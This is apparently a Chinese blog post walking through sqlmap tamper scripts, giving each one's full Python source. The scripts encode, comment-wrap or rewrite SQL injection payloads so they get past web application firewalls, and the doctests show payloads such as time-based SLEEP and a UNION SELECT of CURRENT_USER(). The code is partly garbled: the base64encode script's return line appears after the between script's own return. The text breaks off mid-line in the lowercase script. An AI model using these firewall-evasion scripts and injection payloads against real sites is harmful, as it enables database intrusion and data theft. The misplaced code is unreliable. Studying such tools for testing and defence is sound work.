<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces apostrophe character with its UTF-8 full width counterpart</span><br><span class="line"> </span><br><span class="line">    References:</span><br><span class="line">        * http://www.utf8-chartable.de/unicode-utf8-table.pl?start=65280&amp;number=128</span><br><span class="line">        * http://lukasz.pilorz.net/testy/unicode_conversion/</span><br><span class="line">        * http://sla.ckers.org/forum/read.php?13,11562,11850</span><br><span class="line">        * http://lukasz.pilorz.net/testy/full_width_utf/index.phps</span><br><span class="line"> </span><br><span class="line">    &gt;&gt;&gt; tamper(&quot;1 AND &#x27;1&#x27;=&#x27;1&quot;)</span><br><span class="line">    &#x27;1 AND %EF%BC%871%EF%BC%87=%EF%BC%871&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"> </span><br><span class="line">    return payload.replace(&#x27;\&#x27;&#x27;, &quot;%EF%BC%87&quot;) if payload else payload</span><br></pre></td></tr></table></figure>

<h2 id="apostrophenullencode"><a href="#apostrophenullencode" class="headerlink" title="apostrophenullencode"></a>apostrophenullencode</h2><p>将‘使用%00%27进行替换。中间增加%00</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces apostrophe character with its illegal double unicode counterpart</span><br><span class="line"> </span><br><span class="line">    &gt;&gt;&gt; tamper(&quot;1 AND &#x27;1&#x27;=&#x27;1&quot;)</span><br><span class="line">    &#x27;1 AND %00%271%00%27=%00%271&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"> </span><br><span class="line">    return payload.replace(&#x27;\&#x27;&#x27;, &quot;%00%27&quot;) if payload else payload</span><br></pre></td></tr></table></figure>

<p>3.appendnullbyte 主要表现为在每行的最后增加一个%00</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Appends encoded NULL byte character at the end of payload</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * Microsoft Access</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass weak web application firewalls when the back-end</span><br><span class="line">          database management system is Microsoft Access - further uses are</span><br><span class="line">          also possible</span><br><span class="line"></span><br><span class="line">    Reference: http://projects.webappsec.org/w/page/13246949/Null-Byte-Injection</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND 1=1&#x27;)</span><br><span class="line">    &#x27;1 AND 1=1%00&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    return &quot;%s%%00&quot; % payload if payload else payload</span><br></pre></td></tr></table></figure>

<p>4.base64encode 主要对当前的url进行base64编码达到传递的目的(针对使用bas6e传输的)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Base64 all characters in a given payload</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&quot;1&#x27; AND SLEEP(5)#&quot;)</span><br><span class="line">    &#x27;MScgQU5EIFNMRUVQKDUpIw==&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>5.between 主要是替换一些使用 &gt; &#x3D; &lt; 进行匹配的时候使用between来进行替换</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces greater than operator (&#x27;&gt;&#x27;) with &#x27;NOT BETWEEN 0 AND #&#x27;</span><br><span class="line">    Replaces equals operator (&#x27;=&#x27;) with &#x27;BETWEEN # AND #&#x27;</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line">        * Oracle 10g</span><br><span class="line">        * PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass weak and bespoke web application firewalls that</span><br><span class="line">          filter the greater than character</span><br><span class="line">        * The BETWEEN clause is SQL standard. Hence, this tamper script</span><br><span class="line">          should work against all (?) databases</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND A &gt; B--&#x27;)</span><br><span class="line">    &#x27;1 AND A NOT BETWEEN 0 AND B--&#x27;</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND A = B--&#x27;)</span><br><span class="line">    &#x27;1 AND A BETWEEN B AND B--&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        match = re.search(r&quot;(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^&gt;]+?)\s*&gt;\s*([^&gt;]+)\s*\Z&quot;, payload)</span><br><span class="line"></span><br><span class="line">        if match:</span><br><span class="line">            _ = &quot;%s %s NOT BETWEEN 0 AND %s&quot; % (match.group(2), match.group(4), match.group(5))</span><br><span class="line">            retVal = retVal.replace(match.group(0), _)</span><br><span class="line">        else:</span><br><span class="line">            retVal = re.sub(r&quot;\s*&gt;\s*(\d+|&#x27;[^&#x27;]+&#x27;|\w+\(\d+\))&quot;, &quot; NOT BETWEEN 0 AND \g&lt;1&gt;&quot;, payload)</span><br><span class="line"></span><br><span class="line">        if retVal == payload:</span><br><span class="line">            match = re.search(r&quot;(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^=]+?)\s*=\s*(\w+)\s*&quot;, payload)</span><br><span class="line"></span><br><span class="line">            if match:</span><br><span class="line">                _ = &quot;%s %s BETWEEN %s AND %s&quot; % (match.group(2), match.group(4), match.group(5), match.group(5))</span><br><span class="line">                retVal = retVal.replace(match.group(0), _)</span><br><span class="line"></span><br><span class="line">    return retVal</span><br><span class="line">    return base64.b64encode(payload.encode(UNICODE_ENCODING)) if payload else payload</span><br></pre></td></tr></table></figure>

<p>6.bluecoat 针对mysql的编码，再每个空格前使用%09来达到编码的目的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character after SQL statement with a valid random blank character.</span><br><span class="line">    Afterwards replace character = with LIKE operator</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * Blue Coat SGOS with WAF activated as documented in</span><br><span class="line">        https://kb.bluecoat.com/index?page=content&amp;id=FAQ2147</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * MySQL 5.1, SGOS</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass Blue Coat&#x27;s recommended WAF rule configuration</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users WHERE id = 1&#x27;)</span><br><span class="line">    &#x27;SELECT%09id FROM%09users WHERE%09id LIKE 1&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def process(match):</span><br><span class="line">        word = match.group(&#x27;word&#x27;)</span><br><span class="line">        if word.upper() in kb.keywords:</span><br><span class="line">            return match.group().replace(word, &quot;%s%%09&quot; % word)</span><br><span class="line">        else:</span><br><span class="line">            return match.group()</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = re.sub(r&quot;\b(?P&lt;word&gt;[A-Z_]+)(?=[^\w(]|\Z)&quot;, lambda match: process(match), retVal)</span><br><span class="line">        retVal = re.sub(r&quot;\s*=\s*&quot;, &quot; LIKE &quot;, retVal)</span><br><span class="line">        retVal = retVal.replace(&quot;%09 &quot;, &quot;%09&quot;)</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>7.chardoubleencode 对整个进行二次URL编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Double url-encodes all characters in a given payload (not processing</span><br><span class="line">    already encoded)</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass some weak web application firewalls that do not</span><br><span class="line">          double url-decode the request before processing it through their</span><br><span class="line">          ruleset</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT FIELD FROM%20TABLE&#x27;)</span><br><span class="line">    &#x27;%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        i = 0</span><br><span class="line"></span><br><span class="line">        while i &lt; len(payload):</span><br><span class="line">            if payload[i] == &#x27;%&#x27; and (i &lt; len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:</span><br><span class="line">                retVal += &#x27;%%25%s&#x27; % payload[i + 1:i + 3]</span><br><span class="line">                i += 3</span><br><span class="line">            else:</span><br><span class="line">                retVal += &#x27;%%25%.2X&#x27; % ord(payload[i])</span><br><span class="line">                i += 1</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>8.charencode  对整个进行一次URL编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Url-encodes all characters in a given payload (not processing already</span><br><span class="line">    encoded)</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line">        * Oracle 10g</span><br><span class="line">        * PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass very weak web application firewalls that do not</span><br><span class="line">          url-decode the request before processing it through their ruleset</span><br><span class="line">        * The web server will anyway pass the url-decoded version behind,</span><br><span class="line">          hence it should work against any DBMS</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT FIELD FROM%20TABLE&#x27;)</span><br><span class="line">    &#x27;%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        i = 0</span><br><span class="line"></span><br><span class="line">        while i &lt; len(payload):</span><br><span class="line">            if payload[i] == &#x27;%&#x27; and (i &lt; len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:</span><br><span class="line">                retVal += payload[i:i + 3]</span><br><span class="line">                i += 3</span><br><span class="line">            else:</span><br><span class="line">                retVal += &#x27;%%%.2X&#x27; % ord(payload[i])</span><br><span class="line">                i += 1</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>9.charunicodeencode  对整个进行Unicode编码（也就是S转换为%u0053）【主要体现在asp asp.net上】</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Unicode-url-encodes non-encoded characters in a given payload (not</span><br><span class="line">    processing already encoded)</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * ASP</span><br><span class="line">        * ASP.NET</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2000</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 5.1.56</span><br><span class="line">        * PostgreSQL 9.0.3</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass weak web application firewalls that do not</span><br><span class="line">          unicode url-decode the request before processing it through their</span><br><span class="line">          ruleset</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT FIELD%20FROM TABLE&#x27;)</span><br><span class="line">    &#x27;%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        i = 0</span><br><span class="line"></span><br><span class="line">        while i &lt; len(payload):</span><br><span class="line">            if payload[i] == &#x27;%&#x27; and (i &lt; len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:</span><br><span class="line">                retVal += &quot;%%u00%s&quot; % payload[i + 1:i + 3]</span><br><span class="line">                i += 3</span><br><span class="line">            else:</span><br><span class="line">                retVal += &#x27;%%u%.4X&#x27; % ord(payload[i])</span><br><span class="line">                i += 1</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>10.concat2concatws 主要是作用于把CONCAT(A, B)替换为CONCAT_WS(MID(CHAR(0), 0, 0), A, B)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces instances like &#x27;CONCAT(A, B)&#x27; with &#x27;CONCAT_WS(MID(CHAR(0), 0, 0), A, B)&#x27;</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * MySQL</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * MySQL 5.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass very weak and bespoke web application firewalls</span><br><span class="line">          that filter the CONCAT() function</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;CONCAT(1,2)&#x27;)</span><br><span class="line">    &#x27;CONCAT_WS(MID(CHAR(0),0,0),1,2)&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        payload = payload.replace(&quot;CONCAT(&quot;, &quot;CONCAT_WS(MID(CHAR(0),0,0),&quot;)</span><br><span class="line"></span><br><span class="line">    return payload</span><br></pre></td></tr></table></figure>

<p>11.equaltolike 把等于使用like进行替换</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces all occurances of operator equal (&#x27;=&#x27;) with operator &#x27;LIKE&#x27;</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass weak and bespoke web application firewalls that</span><br><span class="line">          filter the equal character (&#x27;=&#x27;)</span><br><span class="line">        * The LIKE operator is SQL standard. Hence, this tamper script</span><br><span class="line">          should work against all (?) databases</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT * FROM users WHERE id=1&#x27;)</span><br><span class="line">    &#x27;SELECT * FROM users WHERE id LIKE 1&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = re.sub(r&quot;\s*=\s*&quot;, &quot; LIKE &quot;, retVal)</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>12.greatest  主要的作用是把A&gt;B使用GREATEST(A,B+1)&#x3D;A进行替换</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces greater than operator (&#x27;&gt;&#x27;) with &#x27;GREATEST&#x27; counterpart</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line">        * Oracle 10g</span><br><span class="line">        * PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass weak and bespoke web application firewalls that</span><br><span class="line">          filter the greater than character</span><br><span class="line">        * The GREATEST clause is a widespread SQL command. Hence, this</span><br><span class="line">          tamper script should work against majority of databases</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND A &gt; B&#x27;)</span><br><span class="line">    &#x27;1 AND GREATEST(A,B+1)=A&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        match = re.search(r&quot;(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^&gt;]+?)\s*&gt;\s*([^&gt;#-]+)&quot;, payload)</span><br><span class="line"></span><br><span class="line">        if match:</span><br><span class="line">            _ = &quot;%sGREATEST(%s,%s+1)=%s&quot; % (match.group(1), match.group(4), match.group(5), match.group(4))</span><br><span class="line">            retVal = retVal.replace(match.group(0), _)</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>13.halfversionedmorekeywords 使用&#x2F;*!0替换空格</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Adds versioned MySQL comment before each keyword</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * MySQL &lt; 5.1</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * MySQL 4.0.18, 5.0.22</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass several web application firewalls when the</span><br><span class="line">          back-end database management system is MySQL</span><br><span class="line">        * Used during the ModSecurity SQL injection challenge,</span><br><span class="line">          http://modsecurity.org/demo/challenge.html</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&quot;value&#x27; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#x27;QDWa&#x27;=&#x27;QDWa&quot;)</span><br><span class="line">    &quot;value&#x27;/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND &#x27;QDWa&#x27;=&#x27;QDWa&quot;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def process(match):</span><br><span class="line">        word = match.group(&#x27;word&#x27;)</span><br><span class="line">        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:</span><br><span class="line">            return match.group().replace(word, &quot;/*!0%s&quot; % word)</span><br><span class="line">        else:</span><br><span class="line">            return match.group()</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = re.sub(r&quot;(?&lt;=\W)(?P&lt;word&gt;[A-Za-z_]+)(?=\W|\Z)&quot;, lambda match: process(match), retVal)</span><br><span class="line">        retVal = retVal.replace(&quot; /*!0&quot;, &quot;/*!0&quot;)</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p><strong>14.lowercase  主要是把大写转换为小写</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces each keyword character with lower case value</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line">        * Oracle 10g</span><br><span class="line">        * PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass very weak and bespoke web application firewalls</span><br><span class="line">          that has poorly written permissive regular expressions</span><br><span class="line">        * This tamper script should work against all (?) databases</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;INSERT&#x27;)</span><br><span class="line">    &#x27;insert&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        for match in 